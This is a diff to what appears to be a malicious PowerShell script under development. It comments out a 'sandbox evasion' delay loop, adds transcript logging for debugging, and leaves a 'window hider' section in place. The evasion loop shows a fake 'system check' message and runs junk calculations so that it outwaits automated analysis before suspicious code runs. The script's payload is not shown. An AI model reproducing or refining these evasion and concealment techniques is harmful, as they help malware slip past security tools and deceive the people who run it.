@@ -1,12 +1,15 @@
-# --- 0. DORMANT SLEEP (SANDBOX EVASION) ---
-# This outwaits automated sandbox analysis before any suspicious code runs.
-Write-Output "Initializing system check... Please wait."
-$v_wait = 60 
-for ($i = 0; $i -lt $v_wait; $i++) {
-    # Harmless math to keep the CPU cycle looking legitimate
-    $junk_calc = [Math]::Sqrt((Get-Random)) * [Math]::PI
-    Start-Sleep -Seconds 1
-}
+# # --- 0. DORMANT SLEEP (SANDBOX EVASION) ---
+# # This outwaits automated sandbox analysis before any suspicious code runs.
+# Write-Output "Initializing system check... Please wait."
+# $v_wait = 60 
+# for ($i = 0; $i -lt $v_wait; $i++) {
+#     # Harmless math to keep the CPU cycle looking legitimate
+#     $junk_calc = [Math]::Sqrt((Get-Random)) * [Math]::PI
+#     Start-Sleep -Seconds 1
+# }
+
+$v_log = "$env:TEMP\debug_$(Get-Random).txt"
+Start-Transcript -Path $v_log -Append
 
 try {
     # --- 1. WINDOW HIDER ---
@@ -131,4 +134,8 @@ try {
 }
 catch {
     Write-Warning "Critical Error: $($_.Exception.Message)"
+}
+
+finally {
+    # Stop-Transcript
 }
